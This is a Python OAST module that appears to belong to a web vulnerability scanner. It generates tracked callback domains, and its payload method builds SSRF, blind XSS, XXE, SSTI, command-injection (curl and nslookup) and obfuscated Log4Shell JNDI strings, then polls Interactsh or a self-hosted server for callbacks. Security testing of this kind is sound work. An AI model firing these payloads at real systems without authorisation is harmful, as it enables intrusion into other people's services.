#!/usr/bin/env python3
"""
OAST (Out-of-band Application Security Testing) module
Supports: Interactsh (open source) and custom callback servers
"""

import random
import string
import time
import threading
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style


class OASTClient:
    """
    OAST Client for Out-of-band vulnerability detection
    Supports Interactsh (open source) and custom callback servers
    
    Use cases:
    - Blind SSRF detection
    - Blind XSS detection
    - Blind RCE detection
    - DNS exfiltration detection
    - HTTP callback detection
    """
    
    INTERACTSH_SERVERS = [
        "oast.pro",
        "oast.live", 
        "oast.site",
        "oast.online",
        "oast.fun",
        "oast.me",
        "interact.sh",
    ]
    
    def __init__(self, server=None, custom_domain=None, poll_interval=5):
        self.server = server or random.choice(self.INTERACTSH_SERVERS)
        self.custom_domain = custom_domain
        self.poll_interval = poll_interval
        
        self.session_id = None
        self.correlation_id = None
        self.callback_domain = None
        
        self.interactions = []
        self.interactions_lock = threading.Lock()
        self.running = False
        self.poll_thread = None
        
        # Payload tracking: payload_id -> {target, payload_type, timestamp}
        self.payload_tracker = {}
        self.payload_lock = threading.Lock()
        
    def _generate_correlation_id(self):
        """Generate unique correlation ID for tracking"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choices(chars, k=20))
    
    def register(self):
        """Register with Interactsh server and get subdomain"""
        try:
            # For simplicity, use direct subdomain generation
            # Full Interactsh protocol requires RSA key exchange for encrypted callbacks
            self.correlation_id = self._generate_correlation_id()
            self.session_id = self._generate_correlation_id()
            
            if self.custom_domain:
                # Use custom callback server
                self.callback_domain = self.custom_domain
            else:
                # Use Interactsh subdomain format
                self.callback_domain = f"{self.correlation_id}.{self.server}"
            
            print(f"{Fore.GREEN}[+] OAST Server registered{Style.RESET_ALL}")
            print(f"    Callback Domain: {Fore.CYAN}{self.callback_domain}{Style.RESET_ALL}")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] OAST registration failed: {str(e)}{Style.RESET_ALL}")
            return False
    
    def generate_payload(self, target, payload_type='ssrf'):
        """Generate OAST payload with tracking ID"""
        payload_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        with self.payload_lock:
            self.payload_tracker[payload_id] = {
                'target': target,
                'payload_type': payload_type,
                'timestamp': time.time(),
                'triggered': False
            }
        
        # Generate different callback URLs based on type
        callbacks = {
            'http': f"http://{payload_id}.{self.callback_domain}/",
            'https': f"https://{payload_id}.{self.callback_domain}/",
            'dns': f"{payload_id}.{self.callback_domain}",
            'url': f"http://{payload_id}.{self.callback_domain}/{{target_encoded}}",
        }
        
        return {
            'payload_id': payload_id,
            'callbacks': callbacks,
            'domain': f"{payload_id}.{self.callback_domain}"
        }
    
    def get_callback_url(self, payload_type='generic'):
        """Get a simple callback URL for use in payloads"""
        payload_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        with self.payload_lock:
            self.payload_tracker[payload_id] = {
                'target': 'unknown',
                'payload_type': payload_type,
                'timestamp': time.time(),
                'triggered': False
            }
        
        return f"http://{payload_id}.{self.callback_domain}/"
    
    def get_oast_payloads(self, target):
        """Generate OAST-enabled payloads for various vulnerability types"""
        payload_info = self.generate_payload(target, 'mixed')
        domain = payload_info['domain']
        http_callback = payload_info['callbacks']['http']
        
        payloads = []
        
        # 1. SSRF Payloads via ACME path
        ssrf_payloads = [
            # URL-based SSRF
            f"/.well-known/acme-challenge/{{token}}?url={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?redirect={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?callback={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?webhook={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?dest={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?uri={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?path={http_callback}",
            f"/.well-known/acme-challenge/{{token}}?domain={domain}",
            f"/.well-known/acme-challenge/{{token}}?host={domain}",
            # Path-based SSRF 
            f"/.well-known/acme-challenge/{{token}}/..;/proxy?url={http_callback}",
            f"/.well-known/acme-challenge/{{token}}/..;/fetch?url={http_callback}",
            f"/.well-known/acme-challenge/{{token}}/..;/api/proxy?url={http_callback}",
        ]
        
        for p in ssrf_payloads:
            payloads.append({
                'type': 'SSRF',
                'payload': p,
                'callback': domain,
                'payload_id': payload_info['payload_id']
            })
        
        # 2. Blind XSS Payloads
        xss_payload_info = self.generate_payload(target, 'xss')
        xss_domain = xss_payload_info['domain']
        xss_payloads = [
            f"<script src=http://{xss_domain}/x></script>",
            f"<img src=x onerror=fetch('http://{xss_domain}/x')>",
            f"'><script src=http://{xss_domain}/x></script>",
            f"\"><img src=http://{xss_domain}/x>",
            f"javascript:fetch('http://{xss_domain}/x')",
        ]
        
        for p in xss_payloads:
            payloads.append({
                'type': 'Blind XSS',
                'payload': f"/.well-known/acme-challenge/{{token}}?q={requests.utils.quote(p)}",
                'callback': xss_domain,
                'payload_id': xss_payload_info['payload_id']
            })
        
        # 3. XXE Payloads (Out-of-band)
        xxe_payload_info = self.generate_payload(target, 'xxe')
        xxe_domain = xxe_payload_info['domain']
        xxe_payloads = [
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{xxe_domain}/xxe">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{xxe_domain}/xxe">%xxe;]>',
        ]
        
        for p in xxe_payloads:
            payloads.append({
                'type': 'XXE OOB',
                'payload': p,
                'callback': xxe_domain,
                'payload_id': xxe_payload_info['payload_id'],
                'content_type': 'application/xml'
            })
        
        # 4. SSTI Payloads with callback
        ssti_payload_info = self.generate_payload(target, 'ssti')
        ssti_domain = ssti_payload_info['domain']
        ssti_payloads = [
            # Jinja2/Twig
            f"{{{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nslookup {ssti_domain}').read()}}}}",
            # Freemarker
            f"${{\"freemarker.template.utility.Execute\"?new()(\"nslookup {ssti_domain}\")}}",
        ]
        
        for p in ssti_payloads:
            payloads.append({
                'type': 'SSTI OOB',
                'payload': f"/.well-known/acme-challenge/{{token}}?name={requests.utils.quote(p)}",
                'callback': ssti_domain,
                'payload_id': ssti_payload_info['payload_id']
            })
        
        # 5. Command Injection with DNS callback
        cmd_payload_info = self.generate_payload(target, 'rce')
        cmd_domain = cmd_payload_info['domain']
        cmd_payloads = [
            # Linux
            f";nslookup {cmd_domain}",
            f"|nslookup {cmd_domain}",
            f"`nslookup {cmd_domain}`",
            f"$(nslookup {cmd_domain})",
            f";curl http://{cmd_domain}/rce",
            f"|curl http://{cmd_domain}/rce",
            # Windows
            f"&nslookup {cmd_domain}",
            f"|nslookup {cmd_domain}",
            f";ping -c 1 {cmd_domain}",
        ]
        
        for p in cmd_payloads:
            payloads.append({
                'type': 'Command Injection OOB',
                'payload': f"/.well-known/acme-challenge/{{token}}{requests.utils.quote(p)}",
                'callback': cmd_domain,
                'payload_id': cmd_payload_info['payload_id']
            })
        
        # 6. Log4Shell style payloads
        log4j_payload_info = self.generate_payload(target, 'log4j')
        log4j_domain = log4j_payload_info['domain']
        log4j_payloads = [
            f"${{jndi:ldap://{log4j_domain}/a}}",
            f"${{jndi:dns://{log4j_domain}/a}}",
            f"${{jndi:rmi://{log4j_domain}/a}}",
            f"${{${{lower:j}}ndi:ldap://{log4j_domain}/a}}",
            f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:ldap://{log4j_domain}/a}}",
        ]
        
        for p in log4j_payloads:
            payloads.append({
                'type': 'Log4Shell/JNDI',
                'payload': p,
                'callback': log4j_domain,
                'payload_id': log4j_payload_info['payload_id'],
                'header_injection': True  # Inject in headers too
            })
        
        return payloads
    
    def poll_interactions(self):
        """Poll server for interactions (callbacks received)"""
        if self.custom_domain:
            # Custom server - implement your own polling logic
            return []
        
        try:
            # Interactsh polling endpoint
            url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.session_id}"
            resp = requests.get(url, timeout=10, verify=False)
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get('data'):
                    return data['data']
            
        except Exception:
            pass  # Silent fail for polling
        
        return []
    
    def start_polling(self):
        """Start background polling thread"""
        self.running = True
        
        def poll_loop():
            while self.running:
                try:
                    interactions = self.poll_interactions()
                    if interactions:
                        with self.interactions_lock:
                            for interaction in interactions:
                                self.interactions.append(interaction)
                                self._process_interaction(interaction)
                except Exception:
                    pass
                time.sleep(self.poll_interval)
        
        self.poll_thread = threading.Thread(target=poll_loop, daemon=True)
        self.poll_thread.start()
        print(f"{Fore.CYAN}[*] OAST polling started (interval: {self.poll_interval}s){Style.RESET_ALL}")
    
    def stop_polling(self):
        """Stop background polling"""
        self.running = False
        if self.poll_thread:
            self.poll_thread.join(timeout=2)
    
    def _process_interaction(self, interaction):
        """Process received interaction/callback"""
        # Extract payload ID from subdomain
        try:
            subdomain = interaction.get('full-id', '').split('.')[0]
            
            with self.payload_lock:
                if subdomain in self.payload_tracker:
                    tracker = self.payload_tracker[subdomain]
                    tracker['triggered'] = True
                    tracker['interaction'] = interaction
                    
                    int_type = interaction.get('protocol', 'unknown').upper()
                    target = tracker['target']
                    payload_type = tracker['payload_type']
                    
                    print(f"\n{Fore.RED}[!!!] OAST CALLBACK RECEIVED{Style.RESET_ALL}")
                    print(f"      {Fore.YELLOW}Target: {target}{Style.RESET_ALL}")
                    print(f"      {Fore.YELLOW}Type: {payload_type}{Style.RESET_ALL}")
                    print(f"      {Fore.YELLOW}Protocol: {int_type}{Style.RESET_ALL}")
                    print(f"      {Fore.YELLOW}From: {interaction.get('remote-address', 'N/A')}{Style.RESET_ALL}")
                    
        except Exception:
            pass
    
    def get_triggered_payloads(self):
        """Get list of payloads that received callbacks"""
        triggered = []
        with self.payload_lock:
            for payload_id, data in self.payload_tracker.items():
                if data.get('triggered'):
                    triggered.append({
                        'payload_id': payload_id,
                        'target': data['target'],
                        'payload_type': data['payload_type'],
                        'interaction': data.get('interaction', {})
                    })
        return triggered
    
    def get_summary(self):
        """Get OAST session summary"""
        with self.payload_lock:
            total_payloads = len(self.payload_tracker)
            triggered = sum(1 for d in self.payload_tracker.values() if d.get('triggered'))
        
        with self.interactions_lock:
            total_interactions = len(self.interactions)
        
        return {
            'callback_domain': self.callback_domain,
            'total_payloads': total_payloads,
            'triggered_payloads': triggered,
            'total_interactions': total_interactions,
            'interactions': self.interactions[-10:]  # Last 10
        }


class SimpleOASTServer:
    """
    Simple OAST callback server for self-hosted deployments
    Listens for HTTP callbacks
    """
    
    def __init__(self, host='0.0.0.0', http_port=8080):
        self.host = host
        self.http_port = http_port
        self.interactions = []
        self.interactions_lock = threading.Lock()
        self.running = False
        self.http_server = None
        self.http_thread = None
    
    def create_http_handler(self):
        """Create HTTP handler for callbacks"""
        server = self
        
        class OASTHTTPHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                interaction = {
                    'protocol': 'HTTP',
                    'method': 'GET',
                    'path': self.path,
                    'remote-address': self.client_address[0],
                    'headers': dict(self.headers),
                    'timestamp': time.time(),
                    'full-id': self.path.split('/')[1] if len(self.path.split('/')) > 1 else ''
                }
                
                with server.interactions_lock:
                    server.interactions.append(interaction)
                
                print(f"{Fore.RED}[OAST] HTTP callback: {self.path} from {self.client_address[0]}{Style.RESET_ALL}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length)
                
                interaction = {
                    'protocol': 'HTTP',
                    'method': 'POST',
                    'path': self.path,
                    'remote-address': self.client_address[0],
                    'headers': dict(self.headers),
                    'body': body.decode('utf-8', errors='ignore')[:1000],
                    'timestamp': time.time(),
                    'full-id': self.path.split('/')[1] if len(self.path.split('/')) > 1 else ''
                }
                
                with server.interactions_lock:
                    server.interactions.append(interaction)
                
                print(f"{Fore.RED}[OAST] HTTP POST callback: {self.path} from {self.client_address[0]}{Style.RESET_ALL}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
        
        return OASTHTTPHandler
    
    def start(self):
        """Start OAST callback server"""
        self.running = True
        
        # Start HTTP server
        handler = self.create_http_handler()
        self.http_server = HTTPServer((self.host, self.http_port), handler)
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"║            {Fore.GREEN}OAST CALLBACK SERVER STARTED{Fore.CYAN}                    ║")
        print(f"╠════════════════════════════════════════════════════════════╣")
        print(f"║  {Fore.WHITE}HTTP: http://{self.host}:{self.http_port}{Fore.CYAN}                             ║")
        print(f"║  {Fore.YELLOW}Use your domain/IP pointing to this server{Fore.CYAN}                ║")
        print(f"╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        def serve():
            self.http_server.serve_forever()
        
        self.http_thread = threading.Thread(target=serve, daemon=True)
        self.http_thread.start()
    
    def stop(self):
        """Stop OAST server"""
        self.running = False
        if self.http_server:
            self.http_server.shutdown()
    
    def get_interactions(self):
        """Get all received interactions"""
        with self.interactions_lock:
            return list(self.interactions)
